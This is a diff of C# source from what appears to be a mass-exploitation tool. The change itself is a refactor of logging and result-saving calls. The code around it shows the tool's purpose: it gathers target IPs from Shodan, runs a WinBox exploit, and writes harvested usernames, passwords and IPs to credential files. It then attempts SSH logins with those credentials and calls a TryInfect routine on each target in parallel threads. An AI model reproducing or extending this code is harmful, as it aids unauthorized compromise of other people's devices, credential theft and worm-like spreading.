@@ -81,7 +81,7 @@ public class ScanHelper
             {
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddToLogFile($"[-] {ip}: Timed out! {ex.Message}");
+                    Objects.obj.AddToLogFile($"[-] {ip}: Timed out! {ex.Message}");
                 });
                 return null;
             }
@@ -89,7 +89,7 @@ public class ScanHelper
             {
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddToLogFile($"[-] {ip}: Unknown error: {ex.Message} \n");
+                    Objects.obj.AddToLogFile($"[-] {ip}: Unknown error: {ex.Message} \n");
                     mainFormObject.AddLog($"[-] {ip}: Unknown error: {ex.Message}");
                 });
                 return null;
@@ -163,7 +163,8 @@ public class ScanHelper
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
                         mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                        mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
+                        Objects.obj.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
+                        Objects.obj.SaveLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}", "WinBox", "Credentials");
                         mainFormObject.AddCred(user, ip, true);
                     });
                 }
@@ -172,7 +173,7 @@ public class ScanHelper
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
                         mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                        mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
+                        Objects.obj.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
                         mainFormObject.AddCred(user, ip, false);
                     });
                 }
@@ -259,7 +260,7 @@ public class ScanHelper
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
                     mainFormObject.AddLog(text + " " + Convert.ToString(dataTwo));
-                    mainFormObject.AddToLogFile(text);
+                    Objects.obj.AddToLogFile(text);
                 });
                 logger(text, dataTwo);
             }
@@ -268,7 +269,7 @@ public class ScanHelper
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
                     mainFormObject.AddLog(text);// + Environment.NewLine);
-                    mainFormObject.AddToLogFile(text);
+                    Objects.obj.AddToLogFile(text);
                 });
                 logger(text, null);
             }
@@ -279,29 +280,6 @@ public class ScanHelper
         }
     }
 
-    public void Save(string data, string type)
-    {
-        _readWriteLock.EnterWriteLock();
-        try
-        {
-            resultPath = Directory.GetCurrentDirectory() + "\\Results";
-            if (!Directory.Exists(resultPath))
-            {
-                Directory.CreateDirectory(resultPath);
-            }
-            if (!Directory.Exists($@"{resultPath}\WinBox"))
-            {
-                Directory.CreateDirectory($@"{resultPath}\WinBox");
-            }
-            var fileNM = $@"{resultPath}\WinBox\{ScanTime.Replace(":", "_")}-{type}.txt";
-            using StreamWriter st = File.AppendText(fileNM);
-            st.WriteLine(data);
-        }
-        finally
-        {
-            _readWriteLock.ExitWriteLock();
-        }
-    }
     public void SaveShodan(string data)
     {
         _readWriteLock.EnterWriteLock();
@@ -346,7 +324,7 @@ public class ScanHelper
                             {
                                 mainFormObject.AddLog($"[!] {Objects.GetTime()} CREDENTIALS FOUND:\n Username: {user.Username.PadRight(32)} Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                             });
-                            Save($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}", "Credentials");
+                            Objects.obj.SaveLog($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}", "WinBox", "Credentials");
                             sshThreads.Add(new Thread(() => TryInfect(_tar, user)));
                         }
 
@@ -357,7 +335,7 @@ public class ScanHelper
                                 mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}");// + Environment.NewLine);
                             });
                             var _1 = $"Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}";
-                            Save(_1, "List");
+                            Objects.obj.SaveLog(_1, "Winbox");
                         }
                         Parallel.ForEach(sshThreads, thread =>
                         {
@@ -365,14 +343,14 @@ public class ScanHelper
                             thread.Join();
                         });
                         foreach (CollectionListing _cred in MainPage._collectionList)
-                            Save(_cred.Index + ": " + _cred.Username.PadRight(32) + _cred.Password.PadRight(32) + _cred.IPAddress, "Credentials");
+                            Objects.obj.SaveLog(_cred.Index + ": " + _cred.Username.PadRight(32) + _cred.Password.PadRight(32) + _cred.IPAddress, "WinBox", "Credentials");
                     }
                     else
                     {
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
                             mainFormObject.AddLog("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!");// + Environment.NewLine);
-                            mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!\n");// + Environment.NewLine);
+                            Objects.obj.AddToLogFile("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!\n");// + Environment.NewLine);
                         });
                     }
                 }
@@ -393,10 +371,10 @@ public class ScanHelper
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
                             mainFormObject.AddLog($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
-                            mainFormObject.AddToLogFile($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
+                            Objects.obj.AddToLogFile($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                         });
                         var _1 = $"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}";
-                        Save(_1, "Credentials");
+                        Objects.obj.SaveLog(_1, "Winbox", "Credentials");
 
                         ///
                         // Running SSH Scans Simultanisously using Threads
@@ -429,7 +407,7 @@ public class ScanHelper
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
                             mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
-                            mainFormObject.AddToLogFile($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
+                            Objects.obj.AddToLogFile($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
                         });
                         TryInfect(target, user);
                     }
@@ -441,7 +419,7 @@ public class ScanHelper
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
                         mainFormObject.AddLog("[!] Exploit Failed: Target " + target + " might not be vulnerable!");// + Environment.NewLine);
-                        mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + target + " might not be vulnerable!\n");// + Environment.NewLine);
+                        Objects.obj.AddToLogFile("[!] Exploit Failed: Target " + target + " might not be vulnerable!\n");// + Environment.NewLine);
                     });
                 }
             }
@@ -459,7 +437,7 @@ public class ScanHelper
         var ShodanScan = "";
         if (usingShodan) { ShodanScan = "(Shodan Scan) "; }
         else { ShodanScan = ""; }
-        mainFormObject.AddToLogFile("\t[!] Scan Started" + ShodanScan + ": " + Objects.GetTime() + Environment.NewLine + Environment.NewLine);
+        Objects.obj.AddToLogFile("\t[!] Scan Started" + ShodanScan + ": " + Objects.GetTime() + Environment.NewLine + Environment.NewLine);
         mainFormObject.Dispatcher.Invoke(() =>
         {
             mainFormObject.StartScanButton.Content = "Stop";
@@ -486,7 +464,7 @@ public class ScanHelper
                     {
                        // mainFormObject.AddTargetNum(_results.matches.Count);
                         mainFormObject.AddLog("[*] Found " + _results.matches.Count + " target IP's");
-                        mainFormObject.AddToLogFile("[*] Found " + _results.matches.Count + " target IP's");
+                        Objects.obj.AddToLogFile("[*] Found " + _results.matches.Count + " target IP's");
                     });
                     foreach (Match m in _results.matches)
                     {
@@ -496,7 +474,7 @@ public class ScanHelper
                             mainFormObject.Dispatcher.Invoke(() =>
                             {
                                 mainFormObject.AddLog($"[?] Attempting to Exploit: {m.ip_str}");
-                                mainFormObject.AddToLogFile($"[?] Attempting to Exploit: {m.ip_str}\n");
+                                Objects.obj.AddToLogFile($"[?] Attempting to Exploit: {m.ip_str}\n");
                             });
                             _using = m.ip_str;
                             _use = m.ip_str;
@@ -550,7 +528,7 @@ public class ScanHelper
         }
         Thread.Sleep(5000);
         mainFormObject.AddLog($"[!] {Objects.GetTime()} Scan stopped successfully\n");
-        mainFormObject.AddToLogFile("\n\n\t[*] End of Scan: " + Objects.GetTime() + "\n\n###########################################################################\n\n");
+        Objects.obj.AddToLogFile("\n\n\t[*] End of Scan: " + Objects.GetTime() + "\n\n###########################################################################\n\n");
         mainFormObject.Dispatcher.Invoke(() =>
         {
             mainFormObject.StartScanButton.Content = "Start";
